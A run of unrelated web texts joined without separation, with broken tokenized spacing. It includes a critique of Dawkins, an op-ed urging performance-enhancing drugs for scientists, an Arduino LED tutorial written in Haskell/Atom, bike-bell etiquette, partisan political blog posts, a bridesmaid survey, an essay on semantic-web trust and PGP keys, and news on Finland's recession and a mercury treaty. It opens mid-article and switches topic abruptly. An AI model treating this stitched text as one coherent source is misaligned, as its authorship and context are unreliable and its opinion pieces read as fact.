Genes cooperate , evolving together as units to produce traits .
Many researchers continue to find selfish DNA a productive idea , but taking the longer view , the selfish gene per se is looking increasingly like a twentieth - century construct .
Dawkins 's synopsis shows that he has not adapted to this view .
He nods at cooperation among genes , but assimilates it as a kind of selfishness .
The microbiome and the 3D genome go unnoticed .
Epigenetics is an " interesting , if rather rare , phenomenon " enjoying its " fifteen minutes of pop science voguery " , which it has been doing since at least 2009 , when Dawkins made the same claim in The Greatest Show on Earth ( Transworld ) .
Dawkins adheres to a deterministic language of " genes for " traits .
As I and other historians have shown , such hereditarianism plays into the hands of the self - styled race realists ( N. Comfort Nature 513 , 306-307 ; 2014 ) . [ 5 ]

Performance - enhancers are increasingly part of our modern existence , despite our instinct to ban them .
So why do n't we use them for good ?
Let scientists and researchers use drugs that boost productivity and innovation .
Allow them controlled access to prescription medication like Ritalin and Adderall and , with more caveats and limitations , hallucinogens like LSD and Ayahuasca that have been linked to creativity .
Henry Greely , Director of the Stanford Center for Law and the Bio -Sciences , has advocated that " cognition - enhancing " pills are natural for students to take .
" Better - working brains produce things of more lasting value than longer home runs , " he argues .
Similarly , we should encourage our scientists to experiment , if they so desire .
In our culture , performance - enhancing drugs are seen as a vehicle for cheating .
For example , athletes who use steroids or human growth hormone are weeded out through testing policies , punished , and publicly shamed .
But these drugs are more common than one might think , and their use extends beyond sports -- military pilots have been given amphetamines for missions , and some of the most competitive college campuses are rife with illicit use of ADD medication .
The arguments against performance - enhancers are the same in both athletics and academics -- users gain an unfair competitive edge , and they harm themselves in the process .
High school football players ruin their bodies with steroids ; college students who take Ritalin and Adderall fry their brains to unfairly outperform their peers .
As a society , we 're not willing to endorse a culture in which one has to inject oneself with chemicals in order to be a pro baseball player ; it 's just not worth the home runs .
But for scientists and researchers , particularly those working on medical advancements , things are different .
They 're working for the public good .
Fairness matters less .
If one biochemist or physicist " cheats " to gain an edge over a rival research lab , university department , or grant competitor , it may be unethical , but we should be willing to forgive if it means one less day on earth with incurable cancer or massive emissions of carbon gas .
As for health concerns , well , we are talking about adults , and we should be willing to let scientists and researchers make that sacrifice .
Letting adults use performance - enhancing substances in a controlled fashion would have its upside .
After all , steroids worked in baseball - - in 1985 , Major League Baseball players hit 3,602 home runs ; in 2000 , they hit 5,693 .
Throw fairness out the window , and let 's see what happens .
Update Sept 28,2010 : the Makefile mentioned below worked fine , except for something having to do with timing .
I was too lazy to track the problem down , but fortunately , I found an scons script ( using the scons build system ) that I modified to run on Mac OSX , and it works perfectly .
The original script is here — thanks Homin Lee !
The post has been modified appropriately .
Update Oct 1 , 2010 : Homin Lee has updated the script to work on Mac OSX , so you can just grab the original script now .
It ’s been a few months almost a year ( ! ) since John Van
Enk showed us how to twinkle ( blink ) an LED on his Arduino microcontroller using Atom / Haskell .
Since that time , Atom ( a Haskell embedded domain - specific language for generating constant time / space C programs ) has undergone multiple revisions , and the standard Arduino tool - chain has been updated , so I thought it ’d be worthwhile to “ re- solve ” the problem with something more streamlined that should work today for all your Haskell ->
Arduino programming needs .
With the changes to Atom , we can blink a LED with just a couple lines of core logic ( as you ’d expect given the simplicity of the problem ) .
For this post , I ’m using
If you ’ve played with the Arduino , you ’ve noticed how nice the integrated IDE / tool - chain is .
Ok , the editor leaves everything to be desired , but otherwise , things just work .
The language is basically C with a few macros and Atmel AVR - specific libraries ( the family to which Arduino hardware belongs ) .
However , if you venture off the beaten path at all — say , trying to compile your own C program outside the IDE — things get messy quickly .
Fortunately , with the scons script , things are a piece of cake .
What we ’ll do is write a Haskell program AtomLED.hs and use that to generate AtomLED .c .
From that , the scons script will take care of the rest .
The Core Logic
Here ’s the core logic we use for blinking the LED from Atom :
ph :: Int ph = 40000 -- Sufficiently large number of ticks ( the Duemilanove is 16MHz ) blink :: Atom ( ) blink = do on <- bool " on " True -- Declare a Boolean variable on , initialized to True . --
At period ph and phase 0 , do ... period ph $ phase 0 $ atom " blinkOn " $ do call " avr_blink " --
Call a locally - defined C function , blink ( ) .
on < == not_ ( value on ) -- Flip the Boolean .
period ph $ phase ( quot ph 8 ) $ atom " blinkOff " $ do call " avr_blink " on < == not_ ( value on )
And that ’s it !
The blink function has two rules , “ blinkOn ” and “ blinkOff ” .
Both rules execute every 40,000 ticks .
( A “ tick ” in our case is just a local variable that ’s incremented , but it could be run off the hardware clock .
Nevertheless , we still know we ’re getting nearly constant - time due to the code Atom generates . )
The first rule starts at tick 0 , and executes at ticks 40,000 , 80,000 , etc. , while the second starts at tick 40,000 / 8 = 5000 and executes at ticks 5000 , 45,000 , 85,000 , etc .
In each rule , after calling the avr_blink ( ) C function ( we ’ll define ) , it modulates a Boolean upon which blink ( ) depends .
Thus , the LED is on 1/8 of the time and off 7/8 of the time .
( If we wanted the LED to be on the same amount of time as it is off , we could have done the whole thing with one rule . )
The Details
Really the only other thing we need to do is add a bit of C code around the core logic .
Here ’s the listing for the C code stuck at the beginning , written as strings :
[ ( varInit Int16 " ledPin " " 13 " ) --
We 're using pin 13 on the Arduino .
, " void avr_blink ( void ) ; "
]
and here ’s some code for afterward :
[
" void setup ( ) { "
, " // initialize the digital pin as an output : "
, " pinMode ( led Pin , OUTPUT ) ; "
, " } "
, " "
, " // set the LED on or off "
, " void avr_blink ( ) { digital Write ( led Pin , state .
AtomLED.on ) ; } "
, " "
, " void loop ( ) { "
, " " ++ atomName ++ " ( ) ; "
, " } "
]
The IDE tool - chain expects there to be a setup ( ) and loop ( ) function defined , and it then pretty - prints a main ( ) function from which both are called .
The code never returns from loop ( ) .
To blink the LED , we call digitalWrite ( ) from avr_blink ( ) . digitalWrite( ) is provided by the Arduino language .
( In John ’s post , he manipulated the port registers directly , which is faster and does n’t rely on the Arduino libraries , but it ’s also lower - level and less portable between Atmel controllers . )
Atom - defined variables are stored in a struct , so state .
AtomLED.on references the Atom Boolean variable defined earlier .
Make it Work !
Now just drop the scons script into the directory ( the directory must have the same name as the Haskell file , dropping the extension ) , and run
> runhaskell AtomLED.hs
> scons
> scons upload
And your Haskell should be twinkling your LED .
runhaskell AtomLED .hs invokes the Atom compile function to generate a C file and headers ; scons invokes the build script to build an ELF image to upload , and scons upload again invokes the compiler to upload to your board .
This should work for any Atom - generated program you want to run on your Arduino ( modulo deviations from the configuration I mentioned initially ) .
Also , note the conventions and parameters to set in the scons script .
Post if you have any problems , and I might be able to help .
Also , I ’d love to package the boilerplate up into a “ backend ” for Atom , but if you have time , please beat me to it .
Thanks .
Code :
AtomLED.hs
AtomLED.c ( auto - generated from AtomLED.hs — included for the curious ) .
Makefile SConstruct — remember you also need scons .

Ringing Around the World
Bike bells are almost as universal as car horns , but there are still some rather peculiar differences in how they ’re both used and perceived all around the world .
Considering how useless they are amidst heavy automotive traffic , it seems that bells are really only useful ( at least marginally ) for alerting Pedestrians according to what we discovered under Bike Bell Protocols .
Not surprisingly , there are differences in these protocols around the world , and they are n’t limited to just how bells are used , but also in how people react to being dinged by a bell …
So let ’s take a quick world tour , and see what lessons we can bring back .
Let ’s start in Japan , where we would expect to see the gold standard set for social civility and courtesy .
In this video you can easily note the instant and considerate reaction to a bike bell …even on the most absurd settings for a bike – such as an escalator !
An example of the mutual respect offered in Japan is this beautifully crafted piece of brass metalwork called the Universal Sound Bell that creates a melodious ring tone every time you need to let someone know you ’re coming .
As the sellers describe , “ It does n’t say ‘ Get out of my way ’ but rather ‘ Here I am ’ with such charm that even the most hard - bitten pedestrian has no option but to dance gracefully to one side . ”
Elsewhere in the Far East … Among the teeming masses of India , it seems that nobody cares about the bicycle bell , no matter how hard or how much you ring it .
In fact , according to some Commenters , the default rule in India is to use your bell or horn every 5 seconds .
If you do n’t make a sound for more than 5 seconds , it indicates you are no longer alive , and no longer at risk of being crushed to death in traffic .
Allegedly , motorists and bikers from India are so good at honking / ringing that they ’re able to crudely mimic a few popular Hindi songs …
Now that must take lots of practice !
Germany
In keeping with their stereotypically sensible sense of efficiency , it ’s generally acceptable for a German Cyclists to pass Pedestrians without announcing themselves .
As common sense would dictate , you only ring the bell when you absolutely have to .
Otherwise , you do not need to say anything .
If you need to pass a Pedestrian within a meter , you may wish to make a sound or announce “ bicycle ” ( Fahrrad ) , so they know not to make any sudden movements as you ride past .
As many North - American Cyclists also realize most people will stop and turn in the direction of the sound of a bell , making an otherwise considerate warning more dangerous than just passing them silently .
In the land of the Autobahn , everyone already understands the innate logic of slower traffic keeping to the right … and everything just sorts itself out in orderly fashion from there .
USA / Canada
Although there are still lots of dedicated bike paths in the US , and some remarkable closed routes to be discovered around Montreal and the rest of Quebec , there are precious few dedicated bike lanes , and no dedicated Bike Paths ( even those clearly marked as such ) here in Toronto .
Instead , what we think of as bike paths , are actually all considered “ Mult - Use ” paths for everyone ’s benefit , including baby - strollers , rollerbladers , Joggers , and of course all manner of Pedestrians .
Calling out to alert pedestrians which side you ’re on …but some walkers presume you ’re telling them which side to walk on to get out of their way .
People turn their head to check what ’s coming , and by that completely loose their ability to walk straight forward
Scandinavia
The Dutch long ago figured out the obvious – Which is that Pedestrians and Cyclists already do n’t mix well , without also throwing in baby strollers and dog walkers into the mix .
In all large cities in Holland and Denmark there are clearly marked bike paths reserved for the high volume bicycle traffic , and not surprisingly , this designation just encourages more people to use this sensible mode of transport , knowing that they can move at safe and full speed , without being on the constant lookout for sudden moving roadblocks and other forms of erratic or oblivious behaviour .
In North America , it seems that we ’re still figuring out the these basics , after having designed cities for the exclusive use of motor vehicles for far too long already .
England :
On shared paths in England , like canal towpaths for example , bells being rung to let people know that a bike is coming often leaves Pedestrians feeling offended .
Akin to saying , “ Who do you think you are , telling me to get out of your way ” .
One dog walker was quoted as saying , “ she ’s a dog mate , she do n’t understand ! ”
If we can count on one nationality to come up with some dignified protocols around the use of bike bells on mixxed paths , perhaps it might be the Britons .

Progressives are trying to unseat conservative Democrat Blanche Lincoln in the primary runoff in Arkansas ( Lincoln was one of the major obstacles standing in the way of better health care reform ) .
And indeed , a recent survey shows Bill Halter ahead of Lincoln 49 to 45 % .
But now all that is in doubt .
Why ?
Garland County , which was the most populous county where Bill Halter won 3 weeks ago in the primary , has announced that instead of having their normal 42 polling places , will have only 2 open .
In the primary , Halter got heavy support from rural voters , but now those voters will have to travel miles — some even across a mountain range — into a city in order to vote in the runoff on Tuesday .
Many of them work and wo n’t be able to get enough time off to go vote .
Just to make matters worse the county announced that it would allow early voting on Saturday ( yesterday ) , and this was reported by local newspapers and other media , so people who could n’t get time off on a work day would still have a chance to vote .
But when voters showed up at the county office to vote , there was a sign on the door saying that there would be no early voting that day after all — after it had already been publicized .
So some people already made a wasted trip in order to try to vote .
How many of them will make additional effort , just to vote in a runoff primary election ?
I ’m willing to bet not many .
Such is the way elections are decided in America .
UPDATE : It worked .
Blanche Lincoln won the runoff .
Via AMERICAblog , these images of Bobby Jindal 's idiotic sand berm proposal getting washed away are proof beyond any shadow of doubt that Louisiana 's governor is a volcano of hot air and stupid ideas .
According to Len Bahr , a former LSU faculty member who posted these photos , they were all taken from roughly the same location and altitude in the Chandeleur Islands .
As most experts ( including Bahr ) predicted , the sand berms could n't withstand stormy weather and have simply been blown away .

That this would happen was obvious to anyone with half a brain who was paying even a small amount of attention to Jindal 's proposal .
There 's nothing fun at all about watching such an obvious waste of effort go down the drain , but it is captivating to see right - wing talking points literally disintegrate before your very eyes .
Meanwhile , it 's worth noting that the contract to build Bobby 's berms was awarded by Jindal to the number three contributor to his congressional campaigns .
Why brides are increasingly picking fatter bridesmaids to make themselves look better on their big day
As every bride knows , planning the big day involves some big choices .
But it seems picking bridesmaids is the most weighty decision of all .
A third of British women say they would choose an overweight friend to make them appear slimmer as they walk down the aisle , according to research .
Weighty issue : Brides are choosing women who make them look slimmer as their bridesmaids and 40 per cent say skinny guests would make them self - conscious .
( Posed by models )
And many give heavy consideration to their guestlist , as 40 per cent claim slim guests would make them feel self - conscious .
Just under half of brides also go on a diet in order to look their best for their special day .
But the survey , which was carried out by diet planners Slim - Fast , revealed that it 's not just those exchanging vows who worry about their weight at a wedding - a fifth of female guests feel the need to diet for the occasion .
The company 's nutritionist Fiona Hunter said yesterday : ' The wedding season is a time when every woman wants to look good , whether it's for their big day or for their friend 's , and there are ways to boost your confidence .
' This survey reveals that some bridesmaids and even female guests feel the stresses of looking good for the event as well as the bride .
' Brides have always wanted to look their best on their wedding day but this obsession with being slender and skinny is a modern thing .
' If you 're a bride all eyes are going to be on you on the day and this can make a lot of women very self conscious .
' Women are obviously feeling such pressure to look good on their big day that they 're resorting to selecting bridesmaids larger than themselves .
' It 's very sad and a real shame .
Looking at these statistics , it seems to be a worrying new trend . '
Earlier this year , another survey revealed that couples are ditching traditional wedding lists in favour of cold hard cash .
The poll , for Wedding magazine , found 45 per cent of couples would prefer their guests to give them money , and 26 per cent opted for vouchers for the honeymoon .
The same survey found that the average spend for a wedding had reached £ 20,000 .
Finding Bacon's Key
Does Google Show How the Semantic Web Could Replace Public Key Infrastructure ?
Joseph M. Reagle Jr. , < reagle@w3.org >
Abstract
This document briefly introduces the topic of trusted semantic web applications that do not require the existence of an complex public key infrastructure .
It derives from a discussion with Tim Berners - Lee , has been improved given comments from folks in this thread , but I 'm solely responsible for any errors .
Trust
The question of what is trust has been the subject of many a graduate thesis .
For simplicity 's sake I will rely upon the following definition :
Trust ( worthiness )
The degree to which an agent considers an assertion to be true for a given context .
While the term " trust " is often used to denote a very high degree of confidence , there is an associated risk of the assertions being wrong .
In traditional cryptographic applications the trust in a statement is commensurate with the trust in the reputation of its author via a cryptographic binding .
This assurance is accomplished via a digital signature which requires that :
A cryptographic key be strongly bound to a statement via a digital signature algorithm .
Only the specific person has access to the given key .
Consequently the following properties are ensured : authenticity ( the trust in the person , who keeps their key private , is extended to the binding between the key and statement ) , integrity ( any change to the key or statement will result in a different signature ) , and sometimes non-repudiation ( if they key is indeed unique to the control of the person , then the person can not deny the binding because how else would it have been created ? ) .
Frequently , this cryptographic binding is associated with a semantic such as " I believe " , " I assert " , " It is true " , or " I notarize " .
( I tend to think in the semantic " I believe " , however one can often cast a semantic of one type as another : " I believe ' I notarize this was presented to me on this date and time . ' " )
Key Based Trust
How is this cryptographic digital signature created such that it has these properties ?
Public key algorithms are based on trap - door one - way functions :
" The public key gives information about the particular instance of the function ; the private key gives information about the trap door .
Whoever knows the trap door can perform the function easily in both directions , but anyone lacking the trap door can perform the function only in the forward direction .
The forward direction is used for encryption and signature verification ; the inverse direction is used for decryption and signature generation . " — Cryptography FAQ .
Consequently , a single person ( and only that person ) can bind their key to a statement that anyone else , posessing the public key , can confirm !
This is brilliant , but of course the problem of this scenario is that when I want to confirm Kevin Bacon 's signature , how do I know I posess his real public key ?
On the Internet today there are many cryptographic keys out there purporting to belong to famous people .
There may even be some cryptographically signed documents that can be confirmed to be bound to one of those Kevin Bacon keys , but did the real Bacon sign that document ?
Probably not .
How is this problem addressed ?
Not easily .
The two common approaches to finding the right public key are :
Public Key Infrastructure ( PKI ) typically entails a hierarchically organized infrastructure for organizing trust relationships .
For example , what if I wanted to confirm a key I found ?
When I was hired by MIT I was given a floppy disk with MIT 's public key .
I trust this .
This key also signed other keys ( i.e. , a certificate ) such that I can transitively trust those keys as well .
When I find a key purporting to belong to Kevin Bacon I note that it is signed by the Actors ' Guild .
Of course , how do I know that 's the real Actors ' Guild ?
Fortunately , the MIT key has signed the Department of Education ( DoE ) key , which signed the Department of Commerce 's key ( DoC ) , which signed the Actors ' Guild key .
If I successfully verify all the signatures on these certificates ( i.e. , a certificate chain ) I can be confident I have Kevin Bacon 's public key !
I can then use that to confirm if the document was signed by Kevin Bacon .
Web of Trust was popularized by the PGP privacy application and uses a similar transitive trust model as PKI , but without the heirarchical structure .
Instead , it is informal and decentralized .
Typically , when users of PGP meet together at conferences they have key signing parties where they can easily and personally identify each other and add the appropriate signatures to each others ' keys .
If I 'm not sure that the key I found is really Kevin Bacon 's , perhaps I know someone , who knows someone , ( through six degrees ) , that does !
Preponderance Based Trust
If public key infrastructures , transitive trust , and certificate chaining sounds complex , it is !
First , the infrastructure or density of the web of certificates must be sufficient to be able to confirm keys .
Second , extended trust relationships can be nonintuitive to humans .
We like immediate and intuitive reasons for trust .
While the infrastructural mechanism can address institutional requirements for liability , they do n't appeal to us viscerally .
Fortunately , PGP offered an even simpler method of engendering confidence in a key without the need for other signatures : fingerprints !
A critical concept to cryptography is that of a digest value ( hash result or fingerprint ) :
" A ( mathematical ) function which maps values from a large ( possibly very large ) domain into a smaller range .
A ' good ' hash function is such that the results of applying the function to a ( large ) set of values in the domain will be evenly distributed ( and apparently at random ) over the range . " [ X509 ] ... A cryptographic hash is " good " ... [ when ] any change to an input data object will , with high probability , result in a different hash result , so that the result of a cryptographic hash makes a good checksum for a data object . " — RFC2828 .
Strong hash functions are almost always used with a digital signature algorithm because it can be computationally expensive to perform a cryptographic signature on the whole of a document .
Instead , one can take its digest value and sign that instead .
Integrity is maintained because any alteration to the document will yield a different digest value ( and consequent signature ) and it's very difficult to find another document which hashes to the same value .
However , digests are useful independent of a signature .
The nifty PGP fingerprint feature enabled a person to leave the finger print ( the digest value ) of their public key all over the Internet .
Consequently , if I find a purported Bacon key and generate the fingerprint and then find postings on the Internet about or by Bacon with that fingerprint , my confidence that I possess his real key can be very high .
Personally , I 'd intuitively trust a key and its fingerprint , if I found the fingerprint on his official web page , repeated on his fans ' pages , and included in his posting to a celebrity mailing list .
You can find a PGP fingerprint from me on Usenet back in 1996 !
How do you know it is not an imposter ?
It 's improbable : the desire to impersonate me now would have required a determined effort to post messages that sound as if they 've been written by me , ( otherwise they'd be identified as fraudulent ) , for the past six years !
The Semantic Web
The Semantic Web envisions a web of machine processable information in the form of statements :
" The Semantic Web will bring structure to the meaningful content of Web pages , creating an environment where software agents roaming from page to page can readily carry out sophisticated tasks for users ...
The Semantic Web is not a separate Web but an extension of the current one , in which information is given well - defined meaning , better enabling computers and people to work in cooperation . " — The Semantic Web .
On the Web today we have a rich interconnection of the rather stupid hyperlinks ( i.e. " go there " ) between Web pages ; these pages are in many natural language ( e.g. , English , Japanese ) and include descriptions that are useful only to humans , but not our computers .
Even so , the popular Web search service Google is able to make great use of these simple interconnections of hyperlinks to help us find words .
" Google bridges the divide between human - generated indexes and machine - generated analysis .
Y'see , the Web is full of people like you and me , making links between documents ; human beings , making decisions about documents , voting with their links .
When I link to some arbitrary document , it 's an indication that I think that it 's in some way authoritative .
When you link to a document I wrote , you 're indicating that I 'm in some way authoritative .
The Internet is already structured in a meaningful way , but that structure is obscured .
Google teases out the relationship between the URLs , examining the webs of authority : this person is linked to by 50,000 others , and he links to this other person over here , which indicates that person one is a pretty sharp individual , one who 's inspired 50,000 human beings to take time out of their busy schedules to link to him ; and person one thinks that person two is on the ball , which suggests that person two knows what she 's on about . " —
How I Learned to Stop Worrying and Love the Panopticon
What if we had more than simple hyperlinks , but those words that describe things like contact information , schedules , interests , and relationships were also interconnected and easily processed by computers ?
And , just like in Google , statements about a " sharp " person endorsing a person " on the ball " can be made or inferred ?
Not only would search engines become more accurate , but we could have our programs easily organize the abundance of information available to us now but hidden in a babble of inconsistent formats .
( For example , I typically enter the flight itineraries I receive in email into a Web form and my PDA , this is redundant ! )
The Semantic Web and Trust
Not surprisingly , most security applications that entail authorization , access control , or any trust application are statements .
The Semantic Web has tools that allow one to make simple statements of the form : " X has the property Y " .
Computers can then help humans by making use of that information : " Find all pages with property Y " .
Imagine two projects at MIT : one is working on giving credentials to employees such that " Joseph is an employee of MIT " , another is determining who has access to the online reference materials , " MIT Employees can access library services . "
Given the nature of large institutions one might not be surprised to find those working on these two projects know nothing of each other .
But , if they are written using semantic web tools we need not worry about system incompatibilities .
The development of an application to determine " Joseph has read access to MIT library services " is natural to the technology : neither system needs to be re-architected , one simply writes a few rules !
Additionally , one of the strengths of the Semantic Web is that one can make statements about statements .
One of the simplest statements one can make about another statement is : " Statement X has the fingerprint : Z " .
Key Free Trust in the Semantic Web
I 've written about 1600 words so far to identify concepts that I will use towards a simple hypothesis .
Those concepts are :
Trust is one 's confidence in a statement .
Cryptographic signatures permits one to associate a level of trust in a statement ( represented in digital form ) akin to that of the reputation of its author / key .
It 's hard to know if one has the real public key of someone else .
The Semantic Web can be a rich , decentralized , archived , and interconnected source of machine processable statements .
Many of those statements will relate to the identity , relations , capabilities , and authorizations of agents ( human or computer ) .
Cryptography need not be the only basis by which we evaluate trust .
I 've shown that the preponderance of a fingerprint or a link to a site permits a relatively high level of confidence in the owner of the key ( i.e. , PGP fingerprints ) or relevance of a site ( i.e. , Google ) .
The Semantic Web permits statements that describe the digest value of and trust - worthiness of other statements ; it will be permeated with annotated fingerprints .
My hypothesis :
The pervasive use of digest values to identify the statements in the Semantic Web will engender a preponderance of evidence for trust without cryptography .
There is a major and minor consequent of this hypothesis .
The major consequent is that complex public key infrastructure may not be necessary .
Instead , the Semantic Web can mirror the informal and decentralized character of PGP's Web of Trust with some improvements : it is available on and inter-related to the rest of the Web , redundantly archived , harvested and processed by roving agents and engines that can trivially repurpose it or offer other value added services .
For example , institutions that demand liability assurances can easily build applications : " The cost of these statements is $ 4 . " and " I will pay $ 40,000 if these statements are incorrect . "
The minor consequent is the cryptographic signatures themselves might not be necessary to make a reasonable trust evaluation about a statement that has had time to grow into the tangled root structure of the Web .
One might be willing to rely upon information if there is a dense set of inter-related statements of the form : " the information with this digest value ( Z ) , was trustworthy for my purposes . "
Of course , the presence of a digital signature ( beyond the simple digest value ) would increase one 's confidence and the signature itself is a relatively inexpensive operation .
So the true import would be the simplification of a mechanism for obtaining keys .
It can be simple , bottom - up , and decentralized ; if need be , decentralized and extensible systems can simulate hierarchical and closed systems much easier than vice - versa .
Gaming the System
How secure would this system be ?
Nothing is perfectly secure .
People can work for years to build a reputation such that they can cheat once and gain more in that single act than their reputation is otherwise worth .
Or , a community can band together to discredit the reputation of someone they dislike .
This has nothing to do with cryptography , but human nature and game theory .
Recently , a businessman who owned a real store and who also had many loyal Web customers disappeared .
Stewart Richardson built up a solid reputation with many rave reviews on the eBay auction site ; he was known for the timely completion of Web transactions .
Now he is gone and so is the $ 200,000 from his most recent auction .
Last year , tens of thousands people banded together for some amusing political antics : if you asked Google for a " dumb motherfucker " , during the last presidential election the George W. Bush Presidential Campaign On - Line Store was the top return .
Interestingly , the system corrected itself and the search term now returns articles about the phenomona , which seems entirely appropriate !
Revocation
Security applications often require a mechanism to revoke a previous " statement . "
For example , when I no longer consider my 1024 bit key to be strong enough , how do I uproot this statement from the Semantic Web and replace it with my new key ?
As I 've written elsewhere , it can be hard to deprecate pre-existing information , as they say : " You ca n't take something off the Internet - it 's like taking pee out of a pool . "
However , one can make a new statement , " old key is obsoleted by new key " .
The problem then is of ecology and economics .
Would there be an incentive for the always evolving branches of the Semantic Web to gravitate towards this new statement ?
To give you an example , I recently wanted to determine if a vegetarian restaurant that I had heard of still existed .
When I queried Google for " Five Seasons " , the top returns were references to old pages describing what a great place it was .
Only at the bottom of the listing did I find references to new restaurants that now occupied its location .
Few people are going to bother to link to something that no longer exists !
The same characteristic might pertain to the Semantic Web .
However , there are possible solutions .
Just as the W3C uses a " Latest Version " hyperlink within its specifications so that people can always find the latest version of that specification , one could do the same for trust statements .
Many of the recent on - line certificate or built - in expiration certificate mechanisms can be emulated : a statement may include properties that specify its duration or an on - line resource that must be used to determine if statement has been deprecated .
Finding Bacon's Key
To summarize how the application of my hypothesis might work , let 's reconsider the problem of determining the authenticity and integrity of a statement from ( an alleged ) Kevin Bacon .
Perhaps he said , " my latest movie is stupid . "
That would be an odd thing for an actor to say !
So to confirm the statement I query a Semantic Web search engine and find a dense set of statements from otherwise reputable sources commenting on and confirming that statement .
Still , the press tends to repeat the misinformation of their peers .
Ironically enough , the fact that something is well known and commented on is sometimes a reason to distrust the information ( e.g. , urban myths ) .
Fortunately , the statement has a digital signature .
If I can find a key that I trust to be Kevin Bacon's , ( independent of this latest Hollywood controversy ) , that validates the signature , I will be satisfied .
Instead of validating the certificate chain of { MIT , DoE , DoC , Screen Actors Guild , and Kevin Bacon} , I query the Semantic Web for " Kevin Bacon PGP Key " and find a key that is highly inter-related .
I can easily follow the source of references to that key to an official Web page , two large fan pages , and the Internet Movie Data Base .
And indeed , that key can be used to validate the disparaging statement !
I now trust that Kevin Bacon made that statement .
Is that trust perfect ?
No , but it 's sufficient for my following of Hollywood gossip .
( Out of curiousity , I do a similar query for the director Alan Smithee and find many poorly inter-related statements describing his filmography , and a few statements that Alan Smithee is a Director / Writer Guild pseudonym . )
Conclusion
It 's easy to complain of complex public key infrastructures .
It 's also easy to wave one 's hands about pie - in - the - sky solutions .
In this paper , I do both with the excuse that I want my hypothesis to be easily understood .
The ability to assume agents are always on - line is changing the way the security community thinks about digital trust .
I want to push this assumption a little further : not only are security services and data objects on - line , but they identifiable via a URI , easily referenced and annotated with other statements , accessible in a widely deployed syntax ( e.g. , XML ) , and structured as filaments in the Semantic Web .
This could lead to a dense web of information that is sufficient for providing one with confidence sufficient for decentralized ( furthering PGP 's approach ) light - weight trust applications .
Additionally , this can then be the foundation for hierarchical business and risk models ( satisfying PKI 's goal ) .

Republicans keep calling the Gulf oil spill “ Obama ’s Katrina ” and are claiming that Obama has not responding appropriately and quickly enough to the disaster .
But according to a report by CBS news , Republican governors are delaying the deployment of National Guard troops that Obama has authorized to help with the cleanup .
For example , Louisiana Governor Bobby Jindal says
“ We will only be winning this war when we ’re actually deploying every resource . ”
And he complains that the federal government “ can provide more resources ” and “ It ’s clear the resources needed to protect our coast are still not here . ”
But nearly two months after Louisiana requested , and the Pentagon approved 6,000 National Guard troops to help fight the spill , only 18 % of them have been deployed by Jindal .
The situation is even worse in other states affected by the spill .
In Alabama , 3,000 troops are available , but governor Bob Riley has deployed less than 14 % .
In Florida , with 2,500 troops authorized , governor Charlie Crist is utilizing less than 3 % .
And in Mississippi , of 6,000 ready to help , governor Haley Barbour has only deployed 58 , which is less than 1 % .
Obama says “ I urge the governors in the affected states to activate these troops as soon as possible . ” but they appear to be largely ignoring him .
So why would four governors , all Republicans ( although Charlie Crist recently went independent ) want to delay the deployment of National Guard troops that they themselves have requested ?
It is n’t because of money — BP has already agreed to bear the cost of these troops .
Could it possibly be for political reasons ?
Would a governor really sit by and watch their own states be destroyed and their own constituents ’ lives and livelihoods sink in the oil muck just to score cheap political points against our president ?
© Mr. Fish
UPDATE : Jindal responds that the reason he did n’t deploy National Guard troops was because he did n’t need them .
He also complained that the Federal government does n’t understand “ this oil spill as the war that it is . ”
I guess he is trying to position himself as the war governor .
But his record shows that it is he that is n’t taking oil spills seriously .
In fact , most scientists think that Jindal ’s proposed solution would make things worse .
Finland in double - dip recession
Finland 's economy slipped back into recession during the first three months of 2010 , official figures have shown .
During the January to March quarter , its economy contracted by a seasonally - adjusted 0.4 % , after a decline of 0.2 % in October to December of last year .
It is the first eurozone country to re-enter recession after emerging from it , in what is known as a double - dip .
Finland , whose main exports include paper and Nokia mobile phones , was hit hard by the downturn in global trade .
However , official figures , also released on Thursday , showed that its exports have since recovered .
The country 's exports rose 7 % from a year earlier to 4.4bn euros ( $ 5.3bn ; £ 3.6 bn ) in April , the biggest growth since November 2008 .
This resulted in Finland reporting a trade surplus of 355 m euros , its first for six months .
A report last year by the World Economic Forum said Finland had the world 's sixth most competitive economy .
Finland 's economy had previously contracted for four quarters in row , covering the period from April 2008 to June 2009 .
The economy then grew by 0.5 % in the third quarter of 2009 .
A country is generally considered to be in recession following two consecutive quarters of economic contraction .
Along with Luxembourg , Finland is the only eurozone country to have stuck to EU fiscal rules requiring it to keep its government deficit below 3 % of its GDP and its debt under 60 % of GDP .
Eurostat figures say its debt was 44 % of its GDP in 2009 .
The first United Nations negotiating session for a global , legally binding mercury treaty begins today in Stockholm .
Continuing through Friday , this is the first of five planned negotiating sessions that will address global controls on mercury , a toxin that causes neurological damage and impairs brain development in infants and children around the world .
The sessions are expected to result in a global treaty to be signed in late 2013 that will address the emissions and use of mercury in products , wastes and international trade .
Noelle Selin , an assistant professor of engineering systems in MIT ’s Engineering Systems Division , with a joint appointment in atmospheric chemistry in the Department of Earth , Atmospheric and Planetary Sciences , studies the interactions between science and policy in international environmental negotiations .
She sat down with MIT News to discuss the first negotiating session , and what she considers to be the biggest hurdles to signing a global treaty , which is “ not a given ” for the U.S .
Q . What do you see as the biggest challenge in the effort to reduce mercury emissions worldwide ?
A. I see two major intersecting challenges : addressing the global spread of mercury emissions from coal - fired power plants in the context of the increasing demand for energy , and dealing with local impacts of mercury contamination .
The single largest source of anthropogenic mercury emissions is power generation , particularly from coal - fired power plants .
A growing , worldwide demand for energy is increasing the use of coal , and this trend will lead to more mercury emissions if not controlled .
About half of current anthropogenic emissions come from Asia , mostly from China , which is dramatically increasing its use of coal .
Much of the coal used in China is also relatively high in mercury content .
Recent research shows that future emissions of mercury to the atmosphere significantly depend most on how energy - based industrial development proceeds in Asia .
Dealing simultaneously with both local issues and long - range transport of mercury will also be a critical challenge for an international agreement .
Mercury emitted in elemental form travels worldwide .
At the same time , some other forms of emitted mercury deposit close to emission sources .
Local impact also comes from the use of mercury in processes and products .
Mercury is used extensively in artisanal gold mining in developing countries .
Workers and local communities are exposed to some of the highest levels of mercury contamination in the world .
Mercury also continues to be used in products , such as thermometers , thermostats , fluorescent light bulbs and a wide range of electronic equipment , including computer monitors and cell phones .
Disposal of these products , particularly electronic waste ( e- waste ) in developing countries , can expose local populations to mercury .
Q. Even if an international treaty is passed , how will it be implemented or enforced ?
A . In general , implementation and enforcement of international environmental agreements are difficult .
Some countries simply do not have the intention or political will to meet their obligations .
Furthermore , many developing countries lack the financial resources and technical capacity to effectively implement international environmental regulations .
For this reason , some environmental agreements include mechanisms for capacity building , as well as the provision of financial assistance .
